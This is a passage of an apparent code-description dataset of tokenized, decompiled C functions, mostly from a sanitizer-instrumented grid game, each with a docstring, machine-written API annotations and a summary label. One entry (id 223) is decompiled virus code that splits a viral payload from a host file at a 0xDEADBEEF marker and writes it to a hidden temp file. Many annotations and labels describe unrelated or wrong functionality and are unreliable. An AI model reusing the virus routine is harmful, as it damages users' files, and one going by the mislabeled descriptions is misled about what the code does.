            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "g",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v4",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "16",
            "*",
            "(",
            "j",
            "+",
            "10",
            "*",
            "i",
            "+",
            "1",
            ")",
            "+",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "12",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "v4",
            ")",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "g",
            ")",
            ";",
            "if",
            "(",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "g",
            "=",
            "=",
            "186",
            ")",
            "{",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "i",
            ">",
            "0xF",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_22EEA0",
            ",",
            "i",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "j",
            ">",
            "9",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_22EEE0",
            ",",
            "j",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22EF20",
            ",",
            "g",
            ")",
            ";",
            "v5",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "b",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v5",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "16",
            "*",
            "(",
            "j",
            "+",
            "10",
            "*",
            "i",
            "+",
            "1",
            ")",
            "+",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "16",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "v5",
            ")",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "b",
            ")",
            ";",
            "if",
            "(",
            "g",
            "-",
            ">",
            "grid",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "b",
            "=",
            "=",
            "186",
            ")",
            "return",
            "0",
            ";",
            "}",
            "}",
            "}",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1",
            ",",
            "j",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_22F040",
            ",",
            "j",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "}",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1",
            ",",
            "i",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_22F080",
            ",",
            "i",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "}",
            "return",
            "1",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"ismatch\" function is designed to determine whether a file name matches a given pattern, considering permissions and file attributes, but there are potential issues with using \"struct stat\" instead of \"struct stat64\" on Linux systems.",
            "The function `report_` appears to be part of a larger codebase, likely related to file I/O operations, specifically reporting zone information for a storage device, with error handling and formatting functionalities.",
            "The `handle` function likely serves as part of a larger system or library for handling input devices, such as mice, and possibly incorporates error code handling and support for UTF-8 strings.",
            "The \"mismatch\" function appears to handle error reporting for various mismatches or inconsistencies encountered in different contexts, such as bracket mismatches in a brainfuck compiler, endianness mismatches, and version mismatches in RPC (Remote Procedure Call) communications, typically used for error handling and debugging purposes.",
            "The function `report_load4` appears to be part of a memory safety instrumentation library, likely used for reporting issues related to loading 4 bytes of memory without causing program abortion, typically employed in memory debugging and sanitization processes."
        ],
        "longer_label": "The provided code appears to be a complex function for checking the completion status of a game level, containing extensive error handling and reporting mechanisms, potentially related to memory access violations, array bounds checking, and type mismatches, with annotations suggesting its use in file I/O operations, device input handling, and UTF-8 string support."
    },
    {
        "id": 221,
        "docstring_tokens": [
            "The",
            "assert",
            "function",
            "checks",
            "if",
            "a",
            "boolean",
            "condition",
            "is",
            "true",
            ",",
            "if",
            "not",
            "it",
            "prints",
            "a",
            "failure",
            "message",
            "with",
            "the",
            "line",
            "number",
            "and",
            "exits",
            "the",
            "program",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "assert",
            "(",
            "int",
            "line",
            ",",
            "bool",
            "b",
            ")",
            "{",
            "if",
            "(",
            "!",
            "b",
            ")",
            "{",
            "printf",
            "(",
            "\"The test on line %d fails.\\n\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "line",
            ")",
            ";",
            "__asan_handle_no_return",
            "(",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__asan_handle_no_return` appears to be part of a compiler-generated interface for handling scenarios where a function marked with the \"no return\" attribute is called, likely related to address sanitizer routines, potentially used for debugging and runtime analysis of memory-related issues."
        ],
        "longer_label": "The assert function is designed to handle scenarios where a function marked with the \"no return\" attribute is called and is likely related to address sanitizer routines for debugging and runtime analysis of memory-related issues."
    },
    {
        "id": 222,
        "docstring_tokens": [
            "The",
            "code",
            "initializes",
            "a",
            "game",
            "structure",
            ",",
            "sets",
            "its",
            "parameters",
            ",",
            "performs",
            "various",
            "game",
            "actions",
            ",",
            "and",
            "asserts",
            "the",
            "expected",
            "results",
            "of",
            "those",
            "actions",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "testLogic",
            "(",
            ")",
            "{",
            "unsigned",
            "__int64",
            "v0",
            ";",
            "__int64",
            "v1",
            ";",
            "unsigned",
            "__int64",
            "v2",
            ";",
            "bool",
            "v3",
            ";",
            "char",
            "v4",
            ";",
            "unsigned",
            "__int64",
            "v5",
            ";",
            "v0",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "v4",
            ";",
            "if",
            "(",
            "_asan_option_detect_stack_use_after_return",
            ")",
            "{",
            "v1",
            "=",
            "__asan_stack_malloc_6",
            "(",
            "3168L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v1",
            ")",
            "v0",
            "=",
            "v1",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v0",
            "=",
            "1102416563L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "8",
            ")",
            "=",
            "\"1 32 3112 1 g \"",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "16",
            ")",
            "=",
            "testLogic",
            ";",
            "v2",
            "=",
            "v0",
            ">",
            ">",
            "3",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "2147450880",
            ")",
            "=",
            "-",
            "235802127",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "2147451272",
            ")",
            "=",
            "-",
            "218959360",
            ";",
            "v5",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "init",
            "(",
            "16",
            ",",
            "10",
            ",",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "]",
            ")",
            "(",
            "v0",
            "+",
            "52",
            ")",
            ")",
            ";",
            "init",
            "(",
            "4",
            ",",
            "4",
            ",",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "]",
            ")",
            "(",
            "v0",
            "+",
            "2612",
            ")",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_store4",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "32",
            ")",
            "=",
            "16",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "36",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "36",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "36",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "v0",
            "+",
            "36",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "36",
            ")",
            "=",
            "10",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "40",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "40",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_store4",
            "(",
            "v0",
            "+",
            "40",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "40",
            ")",
            "=",
            "4",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "44",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "44",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "44",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "v0",
            "+",
            "44",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "44",
            ")",
            "=",
            "4",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "3124",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "52",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "3124",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "v0",
            "+",
            "3124",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "3124",
            ")",
            "=",
            "0",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "3128",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "3128",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_store4",
            "(",
            "v0",
            "+",
            "3128",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "3128",
            ")",
            "=",
            "0",
            ";",
            "v3",
            "=",
            "levelCompleted",
            "(",
            "(",
            "game_0",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ")",
            ";",
            "assert",
            "(",
            "167",
            ",",
            "v3",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function named \"stack\" likely involves implementing a data structure, possibly a stack, within a larger program, given the presence of structures like \"StackNode\" and \"Stack_tag\", which suggests operations related to stacks such as push and pop, likely within a context such as a binary search tree or a JavaScript runtime environment.",
            "The function `malloc` is typically used for dynamic memory allocation in C programming, but in this context, it has been redefined to allocate memory using Windows API's `GlobalAlloc`, allowing for custom memory management.",
            "The function `__readfsqword` is used to read a 64-bit quadword (8 bytes) from the segment of the FS register on x86 architecture, typically used for accessing thread local storage (TLS) or other specialized data structures."
        ],
        "longer_label": "The provided code defines a function `testLogic` which allocates memory, initializes variables, performs stack operations, and checks for level completion within a larger program, while annotations suggest a likely context involving stack implementation, custom memory management using Windows API's `GlobalAlloc`, and accessing thread local storage using `__readfsqword`."
    },
    {
        "id": 223,
        "docstring_tokens": [
            "The",
            "code",
            "hides",
            "a",
            "virus",
            "within",
            "a",
            "file",
            "by",
            "searching",
            "for",
            "a",
            "specific",
            "hexadecimal",
            "sequence",
            "and",
            "separating",
            "the",
            "virus",
            "from",
            "the",
            "rest",
            "of",
            "the",
            "file",
            "contents",
            "before",
            "writing",
            "the",
            "virus",
            "to",
            "a",
            "temporary",
            "file",
            "and",
            "then",
            "overwriting",
            "the",
            "original",
            "file",
            "with",
            "the",
            "non-virus",
            "content",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "char",
            "*",
            "argv",
            ")",
            "{",
            "__uid_t",
            "v1",
            ";",
            "unsigned",
            "int",
            "v2",
            ";",
            "int",
            "v3",
            ";",
            "char",
            "*",
            "v4",
            ";",
            "int",
            "v5",
            ";",
            "char",
            "offBuf",
            ";",
            "int",
            "offsetState",
            ";",
            "int",
            "virLen",
            ";",
            "int",
            "i",
            ";",
            "int",
            "fileSize",
            ";",
            "int",
            "vir",
            ";",
            "int",
            "fd",
            ";",
            "int",
            "tempFd",
            ";",
            "char",
            "*",
            "fileBuf",
            ";",
            "char",
            "*",
            "virBuf",
            ";",
            "stat",
            "fstatInfo",
            ";",
            "char",
            "buf",
            "[",
            "100",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v18",
            ";",
            "v18",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "fd",
            "=",
            "syscall",
            "(",
            "2L",
            "L",
            ",",
            "argv",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "fd",
            "=",
            "=",
            "-",
            "1",
            ")",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "v1",
            "=",
            "getuid",
            "(",
            ")",
            ";",
            "v2",
            "=",
            "getpid",
            "(",
            ")",
            ";",
            "sprintf",
            "(",
            "buf",
            ",",
            "\"/tmp/.%u.%u\"",
            ",",
            "v2",
            ",",
            "v1",
            ")",
            ";",
            "tempFd",
            "=",
            "syscall",
            "(",
            "2L",
            "L",
            ",",
            "buf",
            ",",
            "194L",
            "L",
            ",",
            "457L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "tempFd",
            "=",
            "=",
            "-",
            "1",
            ")",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "if",
            "(",
            "fstat",
            "(",
            "fd",
            ",",
            "&",
            "fstatInfo",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "syscall",
            "(",
            "3L",
            "L",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "fd",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "offsetState",
            "=",
            "0",
            ";",
            "virLen",
            "=",
            "0",
            ";",
            "i",
            "=",
            "0",
            ";",
            "fileSize",
            "=",
            "0",
            ";",
            "vir",
            "=",
            "1",
            ";",
            "offBuf",
            "=",
            "0",
            ";",
            "virBuf",
            "=",
            "(",
            "char",
            "*",
            ")",
            "malloc",
            "(",
            "fstatInfo",
            ".",
            "st_size",
            ")",
            ";",
            "while",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "read",
            "(",
            "fd",
            ",",
            "&",
            "offBuf",
            ",",
            "1uL",
            "L",
            ")",
            "=",
            "=",
            "1",
            ")",
            "{",
            "if",
            "(",
            "vir",
            ")",
            "{",
            "v3",
            "=",
            "virLen",
            "+",
            "+",
            ";",
            "v4",
            "=",
            "&",
            "virBuf",
            "[",
            "v3",
            "]",
            ";",
            "}",
            "else",
            "{",
            "v5",
            "=",
            "fileSize",
            "+",
            "+",
            ";",
            "v4",
            "=",
            "&",
            "fileBuf",
            "[",
            "v5",
            "]",
            ";",
            "}",
            "*",
            "v4",
            "=",
            "offBuf",
            ";",
            "if",
            "(",
            "offsetState",
            "|",
            "|",
            "(",
            "unsigned",
            "__int8",
            ")",
            "offBuf",
            "!",
            "=",
            "222",
            ")",
            "{",
            "switch",
            "(",
            "offsetState",
            ")",
            "{",
            "case",
            "1",
            ":",
            "if",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "offBuf",
            "=",
            "=",
            "173",
            ")",
            "offsetState",
            "=",
            "2",
            ";",
            "else",
            "offsetState",
            "=",
            "0",
            ";",
            "break",
            ";",
            "case",
            "2",
            ":",
            "if",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "offBuf",
            "=",
            "=",
            "190",
            ")",
            "offsetState",
            "=",
            "3",
            ";",
            "else",
            "offsetState",
            "=",
            "0",
            ";",
            "break",
            ";",
            "case",
            "3",
            ":",
            "if",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "offBuf",
            "=",
            "=",
            "239",
            ")",
            "{",
            "offsetState",
            "=",
            "4",
            ";",
            "vir",
            "=",
            "0",
            ";",
            "fileBuf",
            "=",
            "(",
            "char",
            "*",
            ")",
            "malloc",
            "(",
            "fstatInfo",
            ".",
            "st_size",
            ")",
            ";",
            "}",
            "else",
            "{",
            "offsetState",
            "=",
            "0",
            ";",
            "}",
            "break",
            ";",
            "}",
            "}",
            "else",
            "{",
            "offsetState",
            "=",
            "1",
            ";",
            "}",
            "}",
            "syscall",
            "(",
            "3L",
            "L",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "fd",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "virLen",
            ";",
            "+",
            "+",
            "i",
            ")",
            "write",
            "(",
            "tempFd",
            ",",
            "&",
            "virBuf",
            "[",
            "i",
            "]",
            ",",
            "1uL",
            "L",
            ")",
            ";",
            "syscall",
            "(",
            "3L",
            "L",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "tempFd",
            ")",
            ";",
            "fd",
            "=",
            "syscall",
            "(",
            "2L",
            "L",
            ",",
            "argv",
            ",",
            "514L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "fd",
            "=",
            "=",
            "-",
            "1",
            ")",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "fileSize",
            ";",
            "+",
            "+",
            "i",
            ")",
            "write",
            "(",
            "fd",
            ",",
            "&",
            "fileBuf",
            "[",
            "i",
            "]",
            ",",
            "1uL",
            "L",
            ")",
            ";",
            "syscall",
            "(",
            "3L",
            "L",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "fd",
            ")",
            ";",
            "free",
            "(",
            "virBuf",
            ")",
            ";",
            "free",
            "(",
            "fileBuf",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"__readfsqword\" is likely used to read an unsigned 64-bit integer from the FS segment register at a specified offset, commonly employed in low-level system programming for accessing thread information or processor-specific data structures.",
            "The function `getuid()` appears to be part of a larger system where it retrieves the user ID associated with a file, likely for authentication or permission management purposes in a file control block (FCB) structure.",
            "The function `getpid` appears to be declared multiple times across different code snippets, suggesting its intended purpose is to retrieve the process ID of the current process, likely for system-level programming tasks such as process management or identification.",
            "The function `malloc` is used to allocate memory dynamically in C programming, typically to request a block of memory on the heap of a specified size, as shown in the provided code snippet overriding the default `malloc` implementation with one that uses `GlobalAlloc`."
        ],
        "longer_label": "The provided code appears to be a C function designed to hide a virus within a file by reading the file's content, identifying a specific offset pattern, separating the virus from the original file content, and then writing the virus to a temporary file while restoring the original file's content to the original file, potentially for malicious purposes."
    },
    {
        "id": 224,
        "docstring_tokens": [
            "This",
            "code",
            "sends",
            "a",
            "message",
            "from",
            "a",
            "client",
            "to",
            "a",
            "server",
            "and",
            "prints",
            "the",
            "message",
            "that",
            "was",
            "sent",
            "."
        ],
        "code_tokens": [
            "int",
            "__fastcall",
            "FUN0",
            "(",
            "int",
            "*",
            "a1",
            ",",
            "const",
            "char",
            "*",
            "a2",
            ")",
            "{",
            "size_t",
            "n",
            ";",
            "n",
            "=",
            "strlen",
            "(",
            "a2",
            ")",
            "+",
            "1",
            ";",
            "send",
            "(",
            "*",
            "a1",
            ",",
            "a2",
            ",",
            "n",
            ",",
            "0",
            ")",
            ";",
            "return",
            "printf",
            "(",
            "\"client_send(): send '%s'\\n\"",
            ",",
            "a2",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function strlen is used to calculate and return the length of a string in the given code snippets, with the implementation of a custom strlen function and its usage in other functions and macros.",
            "The function named \"return\" appears to be intended for managing interception contexts for input devices, facilitating interception of input events, possibly for tasks like keyboard or mouse input monitoring, with additional functionalities such as device enumeration and context creation, alongside auxiliary structs and functions, including a scene evaluation function potentially relevant for graphics programming."
        ],
        "longer_label": "The provided code defines a function `client_send` which sends a string to a specified client socket, calculates the length of the string using a custom `strlen` function, and prints a confirmation message, while also referencing unrelated functions and concepts such as interception contexts for input devices and scene evaluation in graphics programming."
    },
    {
        "id": 225,
        "docstring_tokens": [
            "The",
            "code",
            "initializes",
            "a",
            "game",
            "level",
            "by",
            "reading",
            "a",
            "file",
            "containing",
            "grid",
            "data",
            "and",
            "setting",
            "grid",
            "cell",
            "states",
            "and",
            "colors",
            "based",
            "on",
            "the",
            "data",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "game_0",
            "*",
            "g",
            ",",
            "int",
            "level",
            ")",
            "{",
            "unsigned",
            "__int64",
            "v2",
            ";",
            "__int64",
            "v3",
            ";",
            "unsigned",
            "__int64",
            "v4",
            ";",
            "char",
            "v5",
            ";",
            "char",
            "v6",
            ";",
            "char",
            "v7",
            ";",
            "char",
            "v8",
            ";",
            "int",
            "i",
            ";",
            "int",
            "j",
            ";",
            "FILE",
            "*",
            "f",
            ";",
            "char",
            "v12",
            "[",
            "88",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v13",
            ";",
            "v2",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v12",
            ";",
            "if",
            "(",
            "_asan_option_detect_stack_use_after_return",
            ")",
            "{",
            "v3",
            "=",
            "__asan_stack_malloc_0",
            "(",
            "64L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v3",
            ")",
            "v2",
            "=",
            "v3",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v2",
            "=",
            "1102416563L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "8",
            ")",
            "=",
            "\"1 32 20 8 filename \"",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "16",
            ")",
            "=",
            "initLevel",
            ";",
            "v4",
            "=",
            "v2",
            ">",
            ">",
            "3",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "2147450880",
            ")",
            "=",
            "-",
            "235802127",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "2147450884",
            ")",
            "=",
            "-",
            "234618880",
            ";",
            "v13",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "level",
            ")",
            "{",
            "if",
            "(",
            "*",
            "(",
            "char",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "0",
            "|",
            "|",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "51",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "v2",
            "+",
            "51",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "51",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store_n",
            "(",
            "v2",
            "+",
            "32",
            ",",
            "20L",
            "L",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "32",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "40",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "48",
            ")",
            "=",
            "0",
            ";",
            "sprintf",
            "(",
            "(",
            "char",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ",",
            "\"res/lev%d.tet\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "level",
            ")",
            ";",
            "f",
            "=",
            "fopen",
            "(",
            "(",
            "const",
            "char",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ",",
            "\"r\"",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_232940",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "g",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "g",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "g",
            ")",
            ";",
            "}",
            "if",
            "(",
            "i",
            ">",
            "=",
            "g",
            "-",
            ">",
            "n",
            ")",
            "break",
            ";",
            "for",
            "(",
            "j",
            "=",
            "0",
            ";",
            ";",
            "+",
            "+",
            "j",
            ")",
            "{",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_2328E0",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "m",
            ">",
